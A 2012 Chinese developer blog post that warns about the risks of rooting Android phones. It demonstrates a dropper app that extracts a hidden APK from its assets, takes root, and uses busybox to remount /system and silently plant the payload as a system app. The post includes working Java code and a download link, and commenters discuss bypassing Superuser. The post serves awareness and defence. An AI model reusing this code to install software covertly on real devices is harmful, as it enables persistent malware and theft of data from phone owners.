@@ -1,0 +1,439 @@
+
+首页资讯精华论坛问答博客专栏群组更多 ▼
+
+ 
+您还未登录 !登录注册
+
+
+
+
+su1216
+
+
+博客
+微博
+相册
+收藏
+留言
+关于我
+
+
+
+
+.
+
+
+
+
+android手机root后的安全问题 （一）
+博客分类： android
+ 
+androidroot病毒风险安全.
+
+
+前提：你有一部已经root的android手机，并且手机中有busybox和superuser
+ 
+ 
+ 
+导读：本文介绍一种简单的病毒以及如何“防御”。
+ 
+写本博客的原因是：有无数用户觉得root没有什么风险，或者风险不会降临到自己头上。这里告诉大家，其实风险就在身边！
+ 
+ 
+ 
+这里讲的内容其实对于大多数开发者都不是什么新鲜的事情了，使用的技术也非常一般和普遍。
+ 
+虽然大家都知道可以这样这样，但是还是随意下载软件，不加小心，就会掉入陷阱。
+ 
+有些人觉得，只要我下载软件的时候检查软件所申请的权限就好了，其实没有那么简单。
+ 
+ 
+ 
+我们来看看如果一个软件，获得了一次root权限，那么它可以作些什么呢？
+ 
+好吧，我们先来一次“静默安装”！
+ 
+原理很简单，基本上相当于把apk push到手机里面，两个选择
+ 
+data/app
+ 
+system/app
+ 
+如果我是病毒软件，我肯定选择push到system/app
+ 
+我们需要制作两个apk，一个是真正目的的（病毒，real.apk），另一个是假的壳子（fake.apk）
+ 
+首先先制作real.apk，我们只是用来测试，所以这个apk没有什么实际内容（为了节省大家时间，real.apk已经上传）。
+ 
+real.apk里有一个receiver，用来监听开机的广播
+ 
+
+
+Xml代码 
+1.android.intent.action.BOOT_COMPLETED  
+ 
+还有一个activity，没有什么实质内容，然后编译出apk，待用。
+ 
+ 
+ 
+下面来制作壳子
+ 
+新建一个android工程，将之前的real.apk复制到assets目录下
+ 
+然后新建一个activity来测试
+ 
+这个壳子的很简单，它只负责把真实的应用安装到用户手机中，我们再细分一下，首先，将文件assets/real.apk提取出来，放到自己的私有目录中，在本例子中的目录为data/data/com.example.fake/files，这一步是不需要任何权限的
+ 
+
+
+Java代码 
+1.prepareButton.setOnClickListener(new View.OnClickListener() {  
+2.    public void onClick(View v) {  
+3.        File dataFolder = getFilesDir();  
+4.                File jar = new File(dataFolder.getAbsolutePath() + "/real.apk");  
+5.                copyFile("real.apk", jar, mResources);  
+6.    }  
+7.});  
+ 
+其中copFile函数见附件（就是一个简单的io读写操作），这里只给出伪代码
+ 
+
+
+Java代码 
+1.InputStream myInput = null;  
+2.try  
+3.    myInput = resources.getAssets().open(filePath);  
+4.    ……  
+5.catch  
+6.……  
+7.finally  
+8.……  
+ 
+第一步已经完成了，下一步请求root权限，然后将real.apk恶意安装给用户。
+ 
+这里需要使用到busybox，命令如下
+ 
+之所以使用busybox，是因为手机里面可能没有mount、cp、rm等命令（我的手机里面就没有）
+ 
+当然superuser需要同意你使用root权限
+ 
+至此，你的入侵行为已经全部完成！
+ installButton.setOnClickListener(new View.OnClickListener() {
+		public void onClick(View v) {
+			String packageName = getPackageName();
+			String[] commands = {"busybox mount -o remount,rw /system",
+                                 "busybox cp /data/data/" + packageName + "/files/real.apk /system/app/real.apk",
+                                 "busybox rm /data/data/" + packageName + "/files/real.apk"};
+			Process process = null;
+			DataOutputStream dataOutputStream = null;
+
+			try {
+				process = Runtime.getRuntime().exec("su");
+				dataOutputStream = new DataOutputStream(process.getOutputStream());
+				int length = commands.length;
+				for (int i = 0; i < length; i++) {
+					Log.e(TAG, "commands[" + i + "]:" + commands[i]);
+					dataOutputStream.writeBytes(commands[i] + "\n");
+				}
+				dataOutputStream.writeBytes("exit\n");
+				dataOutputStream.flush();
+				process.waitFor();
+			} catch (Exception e) {
+				Log.e(TAG, "copy fail", e);
+			} finally {
+				try {
+					if (dataOutputStream != null) {
+						dataOutputStream.close();
+					}
+					process.destroy();
+				} catch (Exception e) {
+				}
+			}
+		}
+	});
+} 
+重启手机之后，real.apk就能工作了，它会接收到开机广播
+ 
+如果你嵌入了更恶劣的代码，比如偷发短信，窃取邮件，那么用户也是很难察觉的
+ 
+real.apk在settings中会显示在系统应用中，用户不太会怀疑，即使怀疑了，他们也不敢轻易卸载！谁让他们自己随意刷rom呢，每个rom集成的软件都不一样。
+ 
+ 
+ 
+如何防御？！
+ 
+我不知道如何防御，最简单的办法就是，解压你来路不明的apk文件，看看assets文件下有没有什么可疑文件。当然，病毒可能会去掉或者修改文件名的后缀！
+ 
+我手机中安装了卡巴斯基免费版，很可惜，它没有查出病毒（即使你的real.apk嵌入更恶意的代码）
+ 
+大家可以试试其他杀毒软件，比如……希望大家能给个反馈结果
+ 
+ 
+ 
+ 
+ 
+请大家不要用root的手机随意下载软件，更不要以任何借口制造任何病毒！
+ 
+ 
+ 
+ 
+ 
+
+
+android手机root后的安全问题 （一）
+ 
+android手机root后的安全问题 （二）
+ 
+android手机root后的安全问题 （三）
+ 
+android手机root后的安全问题 （四）
+ 
+ 
+ 
+ 
+ 
+android安全问题（一） 静音拍照与被拍
+ 
+android安全问题（二） 程序锁
+ 
+android安全问题（三） 钓鱼程序
+ 
+ 
+
+ 
+ 
+ 
+ 
+转贴请保留以下链接
+ 
+本人blog地址
+ 
+http://su1216.iteye.com/
+ 
+http://blog.csdn.net/su1216/
+
+Real.tar.gz (460.8 KB)
+下载次数: 55
+
+
+
+5 
+顶
+
+6 
+踩.
+
+分享到： 
+.
+
+android手机root后的安全问题 （二）| android OutOfMemory时抓取heap快照
+
+2012-08-31 12:23
+浏览 4485
+评论(9)
+分类:移动开发
+相关推荐
+
+
+评论
+
+
+9 楼 su1216 2012-08-31   
+
+
+ray_linn 写道
+
+android 没有root 根本没法用，乱七八糟的程序上上下下
+
+
+那只能自己权衡了
+确实挺尴尬的
+
+不过应该让广大的非程序员的朋友知道风险到底有多大 
+
+8 楼 ray_linn 2012-08-31   
+
+android 没有root 根本没法用，乱七八糟的程序上上下下
+ 
+
+7 楼 a283037321 2012-08-31   
+
+好东西。。。。厉害。。
+ 
+
+6 楼 su1216 2012-08-31   
+
+
+su1216 写道
+
+
+archy123 写道
+
+
+查看superuser也没啥用，我获得一次root权限之后就能“破解”superuser，让我的应用程序变成永远获得root权限。当然，我也可以让用户查看superuser的时候，感觉一切仍然正常。
+正在考虑要不要把“破解”superuser部分放上来作为第二期。。。
+
+
+root后的手机就相当于获取了管理员权限的操作系统，当然可以为所欲为。superuser一般第一次总会提示的。不过很少人仔细看。除非superuser本身就是被动过手脚的。所以说最危险的还是第三方系统。 
+
+如果您能在第一次安装应用的时候能绕过superuser，还请多多指教。期待您的下期。
+
+
+
+直接绕过superuser没有研究，估计对我这种linux新手还是十分困难的。。。
+不过大家可以反编译一下一起探讨嘛 
+
+5 楼 archy123 2012-08-31   
+
+
+su1216 写道
+
+
+是阿，问题是太多的非开发者不知道root的危险性，有的知道，但是不知道有那么危险，都开开心心的去root的。
+
+查看superuser也没啥用，我获得一次root权限之后就能“破解”superuser，让我的应用程序变成永远获得root权限。当然，我也可以让用户查看superuser的时候，感觉一切仍然正常。
+正在考虑要不要把“破解”superuser部分放上来作为第二期。。。
+
+引用错了。再发次
+root后的手机就相当于获取了管理员权限的操作系统，当然可以为所欲为。superuser一般第一次总会提示的。不过很少人仔细看。除非superuser本身就是被动过手脚的。所以说最危险的还是第三方系统。 
+
+如果您能在第一次安装应用的时候能绕过superuser，还请多多指教。期待您的下期。 
+
+4 楼 archy123 2012-08-31   
+
+
+archy123 写道
+
+
+查看superuser也没啥用，我获得一次root权限之后就能“破解”superuser，让我的应用程序变成永远获得root权限。当然，我也可以让用户查看superuser的时候，感觉一切仍然正常。
+正在考虑要不要把“破解”superuser部分放上来作为第二期。。。
+
+
+root后的手机就相当于获取了管理员权限的操作系统，当然可以为所欲为。superuser一般第一次总会提示的。不过很少人仔细看。除非superuser本身就是被动过手脚的。所以说最危险的还是第三方系统。 
+
+如果您能在第一次安装应用的时候能绕过superuser，还请多多指教。期待您的下期。
+ 
+
+3 楼 su1216 2012-08-31   
+
+
+archy123 写道
+
+root后的手机毫无安全可言，就算作为软件开发人员也会中招，不要轻易刷第三方rom。同时如果非要root，最好使用官方rom自己root后刷入。并且注意查看superuser中那些软件使用root权限。
+
+
+是阿，问题是太多的非开发者不知道root的危险性，有的知道，但是不知道有那么危险，都开开心心的去root的。
+
+查看superuser也没啥用，我获得一次root权限之后就能“破解”superuser，让我的应用程序变成永远获得root权限。当然，我也可以让用户查看superuser的时候，感觉一切仍然正常。
+正在考虑要不要把“破解”superuser部分放上来作为第二期。。。 
+
+2 楼 archy123 2012-08-31   
+
+root后的手机毫无安全可言，就算作为软件开发人员也会中招，不要轻易刷第三方rom。同时如果非要root，最好使用官方rom自己root后刷入。并且注意查看superuser中那些软件使用root权限。
+ 
+
+1 楼 lukelee34 2012-08-31   
+
+
+
+
+发表评论
+
+ 您还没有登录,请您登录后再发表评论 
+
+
+
+
+
+
+su1216
+ 
+浏览: 65625 次
+性别: 
+来自: 北京
+
+
+
+最近访客 更多访客>>
+
+
+
+
+rimoer
+
+
+
+
+zht19880706
+
+
+
+
+heavensay
+
+
+
+
+woyaowenzi
+.
+
+博客专栏
+深入入门正则表达式（jav...
+浏览量：6019.android手机的安全问...
+浏览量：18362.
+
+文章分类
+■全部博客 (93)
+■android (37)
+■Unix & Linux 大学教程 (22)
+■Linux命令行与shell脚本编程大全 (10)
+■java (5)
+■java多线程 (3)
+■虚拟机 (7)
+■设计模式 (1)
+■正则表达式 (6)
+■数据库 (1)
+■其他 (1)
+■转贴 (1)
+
+
+社区版块
+■我的资讯 (0)
+■我的论坛 (70) 
+■我的问答 (19)
+
+
+存档分类
+■2013-02 (1)
+■2013-01 (5)
+■2012-12 (7)
+■更多存档...
+
+
+评论排行榜
+■android手机root后的安全问题 （二）
+■android安全问题（二） 程序锁
+■android安全问题（四） 抢先开机启动 - ...
+■android安全问题（三） 钓鱼程序
+■android手机root后的安全问题 （一）
+
+
+最新评论
+N_HH： su1216 写道N_HH 写道那个，请问，pm是什么。。不懂 ...
+android手机root后的安全问题 （四）
+su1216： N_HH 写道那个，请问，pm是什么。。不懂。shell@an ...
+android手机root后的安全问题 （四）
+N_HH： 那个，请问，pm是什么。。不懂。
+android手机root后的安全问题 （四）
+su1216： tjwink 写道既然已经知道su的数据库地址，可以直接用DB ...
+android手机root后的安全问题 （三）
+tjwink： 既然已经知道su的数据库地址，可以直接用DBOpenHelpe ...
+android手机root后的安全问题 （三）
+
+.
+
+
+--------------------------------------------------------------------------------
+声明：ITeye文章版权属于作者，受法律保护。没有作者书面许可不得转载。若作者同意转载，必须以超链接形式标明文章原始出处和作者。
+© 2003-2012 ITeye.com. All rights reserved. [ 京ICP证110151号 京公网安备110105010620 ] 
+.
